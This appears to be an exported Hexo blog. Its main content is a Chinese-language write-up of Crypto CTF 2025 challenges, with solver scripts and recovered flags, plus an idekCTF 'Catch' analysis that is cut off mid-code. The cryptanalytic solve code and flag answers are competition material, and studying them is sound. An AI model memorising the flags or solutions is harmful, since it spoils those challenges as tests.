threshold:    try:        y_val = p(x_val)  # 计算 p(x)        # 检查是否为整数（有理数且分母为1）        if y_val in ZZ or (y_val in QQ and y_val.denominator() == 1):            points.append((x_val, ZZ(y_val)))  # 记录点            consecutive_non_integer = 0  # 重置计数器        else:            consecutive_non_integer += 1    except Exception as e:  # 处理可能的求值错误（如 x 过大）        consecutive_non_integer += 1    x_val -= 1  # 移至下一个负整数if not points:    raise ValueError(&quot;未找到候选点。检查文件路径或多项式。&quot;)# 按 x 排序（降序：-1, -2, -3, ...）points.sort(key=lambda pt: pt[0], reverse=True)# 步骤2: 推导 L = len(flag)min_x = min(x for x, y in points)  # 最小 x（最负）L_candidate = -min_x  # L = -min_xnum_points = len(points)# 验证点数是否合理（应接近 L_candidate）if num_points &lt; L_candidate:    print(f&quot;警告: 只找到 &#123;num_points&#125; 个点，但 L_candidate = &#123;L_candidate&#125;。可能有遗漏。&quot;)elif num_points &gt; L_candidate:    print(f&quot;警告: 找到 &#123;num_points&#125; 个点，但 L_candidate = &#123;L_candidate&#125;。可能有误报。&quot;)    # 截断至前 L_candidate 个点（假设 x 最小的点可能为误报）    points = points[:L_candidate]L = L_candidate  # 使用 L_candidate 作为 flag 长度# 步骤3: 计算 19 模 L 的逆元（用于索引映射）try:    inv19 = inverse_mod(19, L)  # 19 在模 L 下的逆元except Exception as e:    raise ValueError(f&quot;19 和 L=&#123;L&#125; 不互质，无法计算逆元。错误: &#123;e&#125;&quot;)# 步骤4: 映射每个点到 flag 字符flag_array = [None] * L  # 初始化 flag 数组for x, y in points:    # 计算 a = (19n - 14) % L（来自真点 x 公式）    a = -1 - x  # 因为 x = -(1 + a)    if a &lt; 0 or a &gt;= L:        print(f&quot;警告: x=&#123;x&#125; 的 a=&#123;a&#125; 超出 [0, L-1]。跳过。&quot;)        continue        # 计算 n（真点索引）    c = a + 14  # 来自 a = (19n - 14) % L    n_val = (c * inv19) % L  # n = (c * inv19) mod L        # 计算 b（flag 字符位置）    b_val = (63 * n_val - 40) % L  # b = (63n - 40) % L        # 检查 y 是否为可打印 ASCII    if y &lt; 32 or y &gt; 126:        print(f&quot;警告: x=&#123;x&#125; 的 y=&#123;y&#125; 不是可打印 ASCII。跳过。&quot;)        continue        # 存储字符（位置 b_val）    flag_array[b_val] = chr(y)# 检查是否所有位置都已填充if None in flag_array:    missing = [i for i, char in enumerate(flag_array) if char is None]    print(f&quot;警告: 位置 &#123;missing&#125; 未填充。尝试调整点集合或 L。&quot;)else:    print(&quot;所有位置填充成功。&quot;)# 构建 flag 字符串flag_str = &#x27;&#x27;.join(flag_array)print(f&quot;恢复的 flag: &#123;flag_str&#125;&quot;)#CCTF&#123;7h3_!nTeRn4t10naL_Cr!Min41_pOlIc3_0r9An!Zati0n!&#125;#本题由ChatGPT和Deepseek提供思路，Deepseek提供代码\n3.Mechanic代码很短，但是遇见了不认识的库，多半是在调用库函数加密了，上网找找如何解密。搜索KryptonKEM找到了https://github-wiki-see.page/m/aabmets/quantcrypt/wiki/Code-Examples，看到“KryptonKEM for Asymmetric File Encryption”一节，找到了相关的示例代码。加密的流程是，读取flag.png，生成40位随机数，根据该随机数的比特，决定是对明文/上一轮密文进行一次加密，并将skey(secret_key)写入文件中，还是伪造一组skey写入文件中。因此，一共生成了40次密钥，其中有部分是真的，也有一些是假的。根据最后的文件名flag_22.enc，一共进行了23轮加密。同时我们可以知道，先加密的密钥一定在后加密的密钥之前。所以，我们可以从最后一个密钥开始，不断向前试探，得到最初的文件。如果遇到假私钥，解密会报错，根据能否解密判断是否为真的私钥。为了防止解密中间文件被占用而无法写入，每一个文件都使用不同的文件名。运行一遍程序，就可以得到最初的flag.png以及，kem.param_sizes.sk_size = 3168（自己偷偷装这个库，在python跑一遍就知道了）\n#Crypto CTF https://cr.yp.toc.tf/ mechanic题解#!/usr/bin/env python3from quantcrypt.kem import MLKEM_1024from quantcrypt.cipher import KryptonKEMfrom pathlib import Pathkem = MLKEM_1024()kry = KryptonKEM(MLKEM_1024)SK_SIZE = 3168TOTAL_LAYERS = 23# --- 1. 读取并切分 output.raw ---raw = Path(&#x27;output.raw&#x27;).read_bytes()assert len(raw) % SK_SIZE == 0, &quot;output.raw 长度必须是 SK_SIZE 的整数倍&quot;chunks = [ raw[i:i+SK_SIZE]           for i in range(0, len(raw), SK_SIZE) ]# --- 2. 准备初始密文路径 ---current_ct = Path(&#x27;flag_22.enc&#x27;)found_sks = []# 从后往前遍历每一段私钥for idx, sk in enumerate(reversed(chunks)):    if len(found_sks) &gt;= TOTAL_LAYERS:        break    # 生成唯一的临时输出文件名    tmp_path = Path(f&#x27;tmp_&#123;len(found_sks)&#125;.out&#x27;)    try:        # 解密到唯一文件        kry.decrypt_to_file(sk, current_ct, tmp_path)        # 解密成功，记录私钥，并更新 current_ct        found_sks.append(sk)        current_ct = tmp_path        print(f&quot;✔ 用 chunks[&#123;len(chunks)-1-idx&#125;] 解出了第 &#123;len(found_sks)&#125; 层 → &#123;tmp_path.name&#125;&quot;)    except Exception as e:        print(&quot;ERROR: &quot;,e)        continueassert len(found_sks) == TOTAL_LAYERS, &quot;没找到所有私钥段！&quot;# 最终把 current_ct 重命名为 flag.pngcurrent_ct.rename(&#x27;flag.png&#x27;)print(&quot;🎉 已成功还原出 flag.png&quot;)#CCTF&#123;k3y_3NcAp5uL4t!0n_M3cH4n1Sms!&#125;#本题由ChatGPT提供思路和代码，略做修正\n4.Mancity气急败坏的典型示例——不过还是先分析一下代码吧keygen()生成了两个质数，这两个质数都由同一个256bit的质数p变化而来，质数r在p的每一个bit后都增加一个&#39;1&#39;，质数q在p后面增加256个&#39;1&#39;，这样q和r都是512位质数，且其中一半的位我们已经知道了假设bin(p)=10010…01，则r = 1101011101…0111，q = 10010…011111…11，则q的低256位已知。我们将q和r划分为high和low，其中高256位为high，低256位为low，则$q_{low} = 2^{256}-1$。对$n = q*r$两边同时模$2^{256}$，则可知$n$的低256位完全由$q_{low}$和$r_{low}$决定，于是可以求$q_{low}$的逆元，乘上$n$的低256位，再模$2^{256}$，得到$r_{low}$。$r_{low}$的二进制形式里，有一半是&#39;1‘，另一半是p的低128位。由此我们得到了p的低128位，也就是q的256-383位，于是可以重复上述过程，每次只需要调整模数，就可以不断向p的高位推进。理论上这个方法可以推进到只剩最后1位未知，实际上运行到240位的时候就报错了，不过剩下16位并不算多，暴力破解一轮即可。得到p后推出q和r，进而还原消息m。\n事后发现，如果$r_{low}$解出来的最高位是0，那么填充1的位置不会被正确检测到，因而不能得到正确的p。我增加了对于$r_{low}$比特长度的检测，如果是奇数，就补上最前面的&#39;0&#39;，这样就可以继续解码了。枉我气急败坏，甚至写了5个同样的函数去做同一件事……还是不够老练只需要使用最后的recover()函数，循环代入每一轮的p，加上最后256个&#39;1&#39;作为$q_{low}$，即可解出。\n#Crypto CTF https://cr.yp.toc.tf/ Mancity题解def decode(p_man:str):    orig_bits = &#x27;&#x27;    for i in range(0, len(p_man), 2):        two_bits = p_man[i:i + 2]        if two_bits == &#x27;01&#x27;:            orig_bits += &#x27;0&#x27;        elif two_bits == &#x27;11&#x27;:            orig_bits += &#x27;1&#x27;        else:            raise ValueError(f&quot;Invalid bit pair: &#123;two_bits&#125;&quot;)    return orig_bitsdef recover_256(n:int):    q = 2**256-1    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_128(n:int):    q = int(&#x27;11011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_64(n:int):    q = int(&#x27;111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_32(n:int):    q = int(&#x27;11110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_16(n:int):    q = int(&#x27;110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover(n:int,q_bit:str):    q = int(q_bit+&#x27;1&#x27;*256, 2)    modulus = 2 ** (len(q_bit) + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return p# 给定参数n = 147170819334030469053514652921356515888015711942553338463409772437981228515273287953989706666936875524451626901247038180594875568558137526484665015890594045767912340169965961750130156341999306808017498374501001042628249176543370525803456692022546235595791111819909503496986338431136130272043196908119165239297# 恢复因子#p = recover_256(n)#print(decode(p))#第一轮的p:11011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#这是最低的128位#p2 = recover_128(n)#print(decode(p2))#第二轮的p:111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#这是128+64=192位#p3 = recover_64(n)#print(decode(p3))#第三轮的p：11110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#128+64+32=224位#p4 = recover_32(n)#print(decode(p4))#110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#...+16=240位for i in range(10000,2**18):    s = bin(i)[2:] + &#x27;110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27; + &#x27;1&#x27;*256    q = int(s, 2)    if not (n%q):        print(q)        break#b&#x27;CCTF&#123;M4nch3sReR_c0D!ng_wI7H_RSA&#125;&#x27;#本题由自己提供思路和代码\n5.Vainrat这题……我都想原封不动放到我们学校的校赛或者类似的比赛上了，如果我有机会的话。太阴了，阴得没边。服务器创建精度为440位的实数域，每次交互时，输入c获取最新的y值，输入q退出。但是，只有尝试的次数足够多，才能抓到老鼠，得到位置，至少需要20次尝试以后，才能稳定获得y。我们的目标是得到x0，也就是flag转为整数后前面加小数点。由于每次求平均数和开方都会有精度损失，最后可能不能一次解出完整的flag，需要修正。因此我们需要从可以得到的yi中，获得上一步的信息，直到最终的x0。研究一下rat()函数：第一行将x和y求平均数，第二行将上一步的x和y求几何平均数，最后返回新的x和新的y。如果直接把代码丢给AI，AI们很容易误以为这段代码是求x和y的算数平均数(AM)和几何平均数(GM)，并将AM赋给x，GM赋给y。因为被AI阴了导致没做出来，其实不难的。以及，多次试验会发现，y会越来越小。如果当成AMGM，那每个y都应该小于对应的x，这样y应该越来越大。我先得到两组连续的y。这里运气不错得到了$y_{19}$和$y_{20}$，如果没得到$y_{19}$，拿$y_{21}$也一样。我们有公式$x_i = \\frac{(x_{i-1} + y_{i-1})}{2}$，$y_i = \\sqrt{x_i y_{i-1}}$。因此，根据连续的$y_i$，$y_{i-1}$，可以得到$x_i = \\frac{y_i^2}{y_{i-1}}$。这样我们就有了一组$x_i$和$y_i$。有了$x_i$和$y_i$，就有$y_{i-1} = \\frac{y_i^2}{x_i}$，$x_{i-1} = 2x_i - y_{i-1} = 2x_i - \\frac{y_i^2}{x_i}$，写出函数。因为懒得打理变量所以即使x回到$x_0$了变量名还是x19（）总之这样就能得到x0了。但是我们不知道flag有多少位，所以需要一位一位尝试，转成比特后全都是可打印字符的/以CCTF开头的就是可能的解。\n#Crypto CTF https://cr.yp.toc.tf/ vainrat题解from decimal import *from Crypto.Util.number import long_to_bytes&#x27;&#x27;&#x27;def rat(x, y):\tx = R(x + y) * R(0.5)\ty = R((x * y) ** 0.5) #这个x是上一步的x!也就是算数平均数，而不是参数x\treturn x, y&#x27;&#x27;&#x27;getcontext().prec = 460def return_previous(x:Decimal,y:Decimal)-&gt;(Decimal, Decimal):    return (Decimal(2)*x - (y**2/x),y**2/x)def is_bytes_printable(data):    &quot;&quot;&quot;    判断bytes对象是否可打印。    Args:        data: bytes对象。    Returns:        如果bytes对象可打印，返回True，否则返回False。    &quot;&quot;&quot;    for byte in data:        if not (32 &lt;= byte &lt;= 126):  # 检查是否在ASCII可打印字符范围            return False    return Truey20 = Decimal(&#x27;0.850721739388853613891153549431010808552676731821999538996176033215422247824841783375972792896987047341958120004524577777036176502090&#x27;)y19 = Decimal(&#x27;0.850721739389079303159246072119468136821544049380443888847082554769733382902933214834218375079868150945588972107307455168793172804985&#x27;)y0 = Decimal(&#x27;0.939435784300590373652615235586222521209371224933347916892430414723880727978737194445756901098227178356345123621981413057062575844130&#x27;)x19 = Decimal(2)*y20**Decimal(2)/y19 - y19for i in range(19):    x19,y19 = return_previous(x19,y19)print(&quot;x = &quot;, x19, &quot;y = &quot;, y19)assert abs(y0 - y19) &lt;Decimal(&quot;0.0000000000000000000000000000000000000000000000000000001&quot;)for i in range(1,461):    res = int(x19*(10**i))    if(is_bytes_printable(long_to_bytes(res))): print(long_to_bytes(res))#CCTF&#123;h3Ur1s7!c5_anD_iNv4rIanTs_iN_CryptoCTF_2025!&#125;#本题由ChatGPT和Deepseek提供错误思路，自行调试得到思路和代码\n6.Matemithflag分成了长为14的段，但是不知道有多少段，由于后面使用了M[0]到M[5]，我们就假设它有6段吧。f到k共6个函数，次数都是2~3次，变量也很多，所有的系数都是小于某个313位质数p的随机数。然后，将每个函数转换到有理数域R上，代入u到z为M[0]到M[5]，计算出结果存入CNST。例：f(M[0], M[1], M[2], M[3], M[4], M[5]) = COEFS[0] * M[0] * M[1] + COEFS[1] * M[0] + COEFS[2] * M[1]之后对于每一个函数都加上一个常数项，常数项是p减去上面的计算结果，再模p，也就是说，在模p的意义下，每个函数都满足function(M[0], M[1], M[2], M[3], M[4], M[5])-CNST[function] ≡ 0 (mod p)因此，我们需要求出满足六个同余方程的解，并选出长度均为14字节的整数结果。由于方程较多，变量较多，次数也较高，可以分批求解。观察发现，函数f, h, j只有u,v,w三个变量，可以解出它们。利用Sagemath的求解器进行求解，有一个明显短的结果，再用u,v,w代入另外三个方程，这样就只剩三个变量，同样可以解出。\n#Crypto CTF https://cr.yp.toc.tf/ matemith题解from Crypto.Util.number import *# 定义模数 pp = 9892984422801315119260311427714389408772405421306235794826917610128461644036928139298330716261F = GF(p)  # 创建有限域# 将系数转换为有限域元素a1 = F(8593371583346286129538282168765198524220954884352992069219549555526097253129502925759872761483)b1 = F(8192555264287905175212103898575474256555217842060435386769432116145712989123062847161390929397)c1 = F(9598573789403814092125115160545174167539204328557118715540593719644188998531033259685435430387)d1 = F(5738603225260621554442220996093767502015758942320213371600986432070445300427944977409453429117)a2 = F(6107224904478508858527197508483774405356161856691777460732363192128980355274418091837270668258)b2 = F(3584245173493717638976874408629921683995390608944250077841702023698807664457252845973088744491)c2 = F(5646173287331462026544218972062953582608380797148923127395811758145598594972832047259631339566)d2 = F(1994681139685786114971936867358158466232859433926848067961874687630342141141862187589124089741)a3 = F(1912186465211454827473018892315659311053527670028135595953520151335825509122313783795561869379)b3 = F(6246883466276200389231653597272295993565421216541002743075041326054203024921176043191679609212)c3 = F(4002308425802254921531592700910138281674785127934610897914017993007060136199147207365547047048)d3 = F(973159800079995512996976852328990077106942094656694887771601292254542762394381629810393447820)# 声明多项式环和变量R.&lt;u,v,w&gt; = PolynomialRing(F)# 定义方程f = a1*u*v + b1*u + c1*v + d1h = a2*u*w + b2*u + c2*w + d2j = a3*v*w + b3*v + c3*w + d3# 创建理想I = R.ideal([f, h, j])# 计算解集solutions = I.variety()# 输出结果if solutions:    print(f&quot;找到 &#123;len(solutions)&#125; 个解:&quot;)    for i, sol in enumerate(solutions, 1):        # 验证解        f_val = f.subs(sol)        h_val = h.subs(sol)        j_val = j.subs(sol)        print(f&quot;\\n验证: f=&#123;f_val&#125;, h=&#123;h_val&#125;, j=&#123;j_val&#125;&quot;)        print(f&quot;解 &#123;i&#125;:&quot;)        print(f&quot;u = &#123;sol[u]&#125;, &#123;long_to_bytes(int(sol[u]))&#125;&quot;)        print(f&quot;v = &#123;sol[v]&#125;,  &#123;long_to_bytes(int(sol[v]))&#125;&quot;)        print(f&quot;w = &#123;sol[w]&#125;,  &#123;long_to_bytes(int(sol[w]))&#125;&quot;)        else:    print(&quot;未找到解&quot;)# 已知的 u, v, w 值u = F(1078804227986401794161149736863793)v = F(2033644392583863279506423899386719)w = F(1631639702310041336611888741434165)# 将系数转换为有限域元素# g 的系数a1 = F(7737077144206080155196706693824644356475708615710271404071364943161652008584970269394416250641)a2 = F(6282097687310252658473848438985225466620614743750918909885172321224925965646628839166491648752)a3 = F(7737077144206080155196706693824644356475708615710271404071364943161652008584970269394416250641)a4 = F(3354788147890488743832873565215769634619909759459203496980671578348799162553954862104978291860)a5 = F(2560270290674636359252235177920929027441112715609783111306743340637878970846852799006820932563)# i 的系数b1 = F(7622670835797214156123791992548663880284352234566921286637648219243086701251627093499322050472)b2 = F(6026769215097777844835562389865313764490318485655789123763637718591748620654875700763740623760)b3 = F(8145050175261359549200629067766090532616263522561328878195831921153188650784907223634130346224)b4 = F(3622105614070476540808786980829452605696331317022729645355376801209444137548670550164418237117)b5 = F(4800360746061605999597274870855047707130861888252519642520437605796496240599924899885487900040)# k 的系数c1 = F(1423338294606985951732736428034353751447528399559929388138157330118213387990891693204997290038)c2 = F(784018806462384388182217012266169299116410899849461442885543245867941419322406775218178098109)c3 = F(7684681843989505989596042520590550892565982707534588920361260899638313817214040416765327284778)c4 = F(4982848574842913858489870338816729222210785430242027484672099513487039514577513464674726403409)c5 = F(7781690757622738625626304200561818137843970209349935834539461705684625161407233281360563620790)# 定义多项式环R.&lt;x, y, z&gt; = PolynomialRing(F)# 代入已知的 u, v, w 后，g, i, k 成为关于 x, y, z 的方程g = a1 * u * x * y + a2 * v + a3 * x + a4 * y + a5i = b1 * v * y * z + b2 * w + b3 * y + b4 * z + b5k = c1 * w * x * z + c2 * u + c3 * x + c4 * z + c5# 创建理想I = R.ideal([g, i, k])# 求解方程组solutions = I.variety()# 输出结果if solutions:    print(f&quot;找到 &#123;len(solutions)&#125; 个解:&quot;)    for idx, sol in enumerate(solutions):        print(f&quot;\\n解 &#123;idx + 1&#125;:&quot;)        print(f&quot;x = &#123;sol[x]&#125;&quot;)        print(f&quot;y = &#123;sol[y]&#125;&quot;)        print(f&quot;z = &#123;sol[z]&#125;&quot;)                # 验证解        g_val = g.subs(sol)        i_val = i.subs(sol)        k_val = k.subs(sol)        print(f&quot;验证: g=&#123;g_val&#125;, i=&#123;i_val&#125;, k=&#123;k_val&#125;&quot;)else:    print(&quot;未找到解&quot;)#CCTF&#123;50lv!n6_7H3_H1dD3n__num8Ers_Pr08l3m_f0r_C51dH_4nd_C5uRf_v14_4uT0m473d_C0pp3r5m17h!!?&#125;#本题由Deepseek提供代码\n后记要学的东西好多呢……虽然靠AI能辅助一部分分析和代码工作，不过更多的还是得靠自己&gt;_&lt;\n一年来都在浅水区闲逛，格相关的东西几乎都不了解，虽然也经常参考别的师傅的题解吧，不过大多都看不太懂，于是我就希望写细致一点，来访的朋友能看得容易些。正好也尝试一下Hexo的公式，为了正常显示它们也是费了一番心思hhh\n","categories":["笔记"],"tags":["Writeup","2025","CryptoCTF"]},{"title":"Hello World","url":"/2025/07/09/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n"},{"title":"第一篇文章","url":"/2025/07/09/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/","content":"Hello World!我正在测试Hexo的功能，看起来似乎还挺简单的，希望我有时间多写写。\n\n简单做个自我介绍，幻夜子雨，或者Illunight，敬上。\nIllunight来源于illusion + night，即为幻夜，子雨是名字。\n普普通通CTFer，主攻crypto方向，其他领域偶有涉猎，学艺不精。\n超级福瑞控，如果去其他社交媒体搜“幻夜子雨”，会搜到相关内容。\n创立这个博客的理由理由嘛……因为最近暑假期间，比较无聊，于是刷各种crypto题，写题解。但是写了这么多的题解只给自己看也太亏了，于是就呈上来，恳求批评与指导。\n（一共也没写几份，博客倒是创得起劲🙄子雨你适可而止）\n总之就是这样~虽然比较轻率地就放上来了，不过也是对自己的一种督促吧，多做，多见识。\n黑历史……？我已经做好这些文章成为自己黑历史的预期了，如果没有对过去的批判，也就没有进步了hhh\n","categories":["笔记"],"tags":["illunight"]},{"title":"2025 idekCTF题解","url":"/2025/08/05/2025%20idekCTF%E9%A2%98%E8%A7%A3/","content":"前言此前四处搜刮题目做的时候想找Decidophobia的题解，找到了Maple师傅的writeups，于是对idekCTF有了点印象。没过多久，自己也是参与上了，不过也做不出几道题，凑个热闹。\n正文第一天一道题都不会，颇有些破防——然后每睡一觉就解出一道，只恨比赛只有两天。\nCryptoCatch题目如下。\nfrom Crypto.Random.random import randint, choiceimport os# In a realm where curiosity roams free, our fearless cat sets out on an epic journey.# Even the cleverest feline must respect the boundaries of its world—this magical limit holds all wonders within.limit = 0xe5db6a6d765b1ba6e727aa7a87a792c49bb9ddeb2bad999f5ea04f047255d5a72e193a7d58aa8ef619b0262de6d25651085842fd9c385fa4f1032c305f44b8a4f92b16c8115d0595cebfccc1c655ca20db597ff1f01e0db70b9073fbaa1ae5e489484c7a45c215ea02db3c77f1865e1e8597cb0b0af3241cd8214bd5b5c1491f# Through cryptic patterns, our cat deciphers its next move.def walking(x, y, part):    # Each step is guided by a fragment of the cat&#x27;s own secret mind.    epart = [int.from_bytes(part[i:i+2], &quot;big&quot;) for i in range(0, len(part), 2)]    xx = epart[0] * x + epart[1] * y    yy = epart[2] * x + epart[3] * y    return xx, yy# Enter the Cat: curious wanderer and keeper of hidden paths.class Cat:    def __init__(self):        # The cat&#x27;s starting position is born of pure randomness.        self.x = randint(0, 2**256)        self.y = randint(0, 2**256)        # Deep within, its mind holds a thousand mysterious fragments.        while True:            self.mind = os.urandom(1000)            self.step = [self.mind[i:i+8] for i in range(0, 1000, 8)]            if len(set(self.step)) == len(self.step):                break    # The epic chase begins: the cat ponders and strides toward the horizon.    def moving(self):        for _ in range(30):            # A moment of reflection: choose a thought from the cat&#x27;s endless mind.            part = choice(self.step)            self.step.remove(part)            # With each heartbeat, the cat takes a cryptic step.            xx, yy = walking(self.x, self.y, part)            self.x, self.y = xx, yy            # When the wild spirit reaches the edge, it respects the boundary and pauses.            if self.x &gt; limit or self.y &gt; limit:                self.x %= limit                self.y %= limit                break    # When the cosmos beckons, the cat reveals its secret coordinates.    def position(self):        return (self.x, self.y)# Adventurer, your quest: find and connect with 20 elusive cats.for round in range(20):    try:        print(f&quot;👉 Hunt &#123;round+1&#125;/20 begins!&quot;)        cat = Cat()        # At the start, you and the cat share the same starlit square.        human_pos = cat.position()        print(f&quot;🐱✨ Co-location: &#123;human_pos&#125;&quot;)        print(f&quot;🔮 Cat&#x27;s hidden mind: &#123;cat.mind.hex()&#125;&quot;)        # But the cat, ever playful, dashes into the unknown...        cat.moving()        print(&quot;😸 The chase is on!&quot;)        print(f&quot;🗺️ Cat now at: &#123;cat.position()&#125;&quot;)        # Your turn: recall the cat&#x27;s secret path fragments to catch up.        mind = bytes.fromhex(input(&quot;🤔 Path to recall (hex): &quot;))        # Step by step, follow the trail the cat has laid.        for i in range(0, len(mind), 8):            part = mind[i:i+8]            if part not in cat.mind:                print(&quot;❌ Lost in the labyrinth of thoughts.&quot;)                exit()            human_pos = walking(human_pos[0], human_pos[1], part)        # At last, if destiny aligns...        if human_pos == cat.position():            print(&quot;🎉 Reunion! You have found your feline friend! 🐾&quot;)        else:            print(&quot;😿 The path eludes you... Your heart aches.&quot;)            exit()    except Exception:        print(&quot;🙀 A puzzle too tangled for tonight. Rest well.&quot;)        exit()# Triumph at last: the final cat yields the secret prize.print(f&quot;🏆 Victory! The treasure lies within: &#123;open(&#x27;flag.txt&#x27;).read()&#125;&quot;)\n题目很有诗意hh但是有点像没开thinking的ChatGPT写的，搞了半天是GPT对抗GPT（×）题目生成一只猫，给定它的初始坐标和所有“思考”块，经过一些移动后给出最终坐标，我们需要从最终坐标中得到移动时使用的思考块，重复20次就能抓到猫，获得flag。受到好多阴间题目的“启发”，我第一想到的已经不是如何破解这个问题，而是代码中有没有漏洞。虽然题目的要求很清晰，但是从第71行的if part not in cat.mind:我看出了两点——1.mind没有变过，始终是最初的1000个byte，其中每个8bytes都不重复，因此，虽然猫的移动使用的step不允许重复，但是用户不影响，用户的输入是可以重复的。2.mind是一连串bytes，因此，即使输入的mind分割成part后，某个part不是step的一员，只要它是mind的连续8bytes，就可以通过。所以，我们其实有1000-8+1=993个part可用，而非猫移动时的125个。虽然其实这两点都没用到，但是我觉得抓漏洞也是我们需要做的……说不定哪次就有用呢，AI不太会做这种“违规”的事，只能靠人自己来。题目还给出了一个limit，它是一个1024位的大质数。考虑每一次walking，part是8个byte，分成4个2*8=16bit的数，这样，新的xx和yy长度最多是原来的x和y加16位，30次就是480位。这样的话，猫最终的坐标也只有256+480=736位，还是远小于limit，而猫的moving过程一定会走满30轮。这个如此大的limit有什么用呢？将起点和终点作为向量，则epart中的四个数可以组成一个2*2矩阵$\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix}$。对于1000个随机byte，划分为2byte一组，一共500组。其中出现数字0的期望为$\\frac{500}{2^{16}}$，因此epart矩阵中出现0是不太可能的，出现连续两个0使得xx或yy = 0 * x + 0 * y = 0就更不可能了，在20次挑战中几乎可以排除，因此我们认为每一次walking后，xx大于x，yy大于y。正着找过去，不管选哪个矩阵都满足$\\begin{bmatrix} x_i &amp; y_i \\end{bmatrix}\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix} = \\begin{bmatrix} x_{i+1} &amp; y_{i+1} \\end{bmatrix}$中的$x_{i+1} &gt; x_i,\\; y_{i+1} &gt; y_i$。对于筛选需要的矩阵没有帮助，逆着找过来，$\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix}$的逆矩阵多半含有分数，存储还是计算都不方便，无论哪个方向都不行。……真的吗？我们可以在$\\mathbb{F}_p$中找逆矩阵。对于随机选取的$[0,\\,2^{16}]$中的数，第一行全0概率约为$\\frac{1}{2^{32}}$，第二行与第一行成比例在$\\mathbb{F}_p \\times \\mathbb{F}_p$中共有 $p$ 种可能，而在$[0,2^{16}) \\times [0,2^{16})$的概率为$\\frac{2^{32}}{p^2} * p = \\frac{2^{32}}{p}$，由于这里的$p = \\text{limit}$约有1024bit，两种情况的概率均远小于1，在20次内可认为都不会发生，即所有矩阵都可逆。由于 $p$ 是一个很大的质数，对于小于 $p$ 的任何正整数 $a$ ，都有$\\text{gcd}(a,p) = 1$，因此一定有逆元 $a^{-1}$ 存在。且因为这里矩阵的每个数都是1~65535（0不考虑），所以除了1以外，其他数的逆元可以表示为$\\frac{kp+1}{a}$，它大于1024-16=1008位，1的逆元当然是1。在同样不考虑1出现在epart中后，原始矩阵的逆矩阵中每个数都很大。这样，因为我们知道 $x_{30}&gt;x_{29}，y_{30}&gt;y_{29}$ ，我们只需找出合适的矩阵，模乘逆矩阵后得到的$(x_{29},y_{29})$满足上式即可。由于最初cat选择的第30个矩阵一定满足，所以至少有一个解。最后我们分析出现多个解的概率。由上可知，逆矩阵中每个元素都很大，因此它们之间间隔也很大，可以看作是随机选择的矩阵。由于最终结果约736位，故期望的倒数第二步结果小于736位。给定最终的 $(x_{30},y_{30})$，$(x_{29},y_{29})$ 满足条件的概率为$(\\frac{2^{736}}{2^{1024}})^2$，因此，除了内定的一个解，在125个矩阵中出现其他解的概率同样极小。这样，只要遍历125个矩阵的逆矩阵，每次都寻找一个，使得倒推的向量中，每一个分量都小于前一步向量的分量，找到30次回到原点，就得到了part的逆序，倒序发送即可。\nfrom ast import literal_evalfrom typing import List, Tuplefrom Crypto.Util.number import getPrimedef find_candidate_prev_points(        mind: bytes,        endpoint: Tuple[int, int],        limit: int) -&gt; List[Tuple[int, int, int]]:    &quot;&quot;&quot;    For each 8-byte part in &#x27;mind&#x27;, treat it as a 2x2 matrix over 